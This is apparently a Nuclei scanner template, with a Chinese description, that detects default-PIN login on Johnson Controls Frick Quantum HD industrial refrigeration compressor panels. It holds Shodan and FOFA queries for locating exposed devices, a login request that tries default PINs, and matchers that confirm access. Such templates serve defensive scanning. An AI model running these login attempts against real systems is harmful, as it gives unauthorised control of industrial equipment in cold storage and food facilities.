id: johnson-controls-default-login

info:
  name: Johnson Controls Frick Quantum HD 压缩机默认登录（弱口令）
  author: mister-joe
  severity: high
  description: |-
    检测到 Johnson Controls Frick Quantum HD 压缩机控制面板可通过默认 PIN 凭据访问。这些工业制冷控制器用于冷库和食品加工设施。默认 PIN 允许对压缩机组进行完全控制。
  reference:
    - https://www.johnsoncontrols.com/industrial-refrigeration/frick-control-panels-and-control-systems/quantum-hd-industrial-refrigeration-control-panel
  classification:
    cwe-id: CWE-798
  metadata:
    verified: true
    max-request: 6
    vendor: johnson-controls
    product: frick-quantum-hd
    shodan-query: http.headers:"PrimeUnity"
    fofa-query: header="PrimeUnity" || body="Quantum HD"
  tags: default-login,iot,ics,scada,johnson-controls,frick

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {"pin":"{{password}}"}

    attack: pitchfork
    payloads:
      password:
        - 1
        - 2
        - 3
        - 10
        - 20
        - 30

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Authorized")'
          - 'contains_all(header, "PrimeUnity","Sessionid")'
        condition: and
